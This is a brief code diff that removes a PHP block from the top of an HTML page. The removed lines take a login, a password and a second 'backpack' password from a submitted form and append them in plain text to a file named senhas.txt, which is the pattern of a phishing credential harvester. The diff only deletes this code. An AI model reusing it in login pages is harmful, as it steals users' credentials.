@@ -1,15 +1,4 @@
-<?php
-$login = $_POST['login']; // ID do formulário de login
-$senha = $_POST['senha']; // ID do formulário de senha
-$senhamochila = $_POST['senham'];
-$all = "Login: ".$login."\nSenha: ".$senha."\n Senha da mochila: ".$senhamochila."\n\n";
 
-
- 
-$fp = fopen("senhas.txt", "a");
-fwrite($fp, $all);
-fclose($fp);
-?>
 
 <!DOCTYPE html>
 <html lang="en">
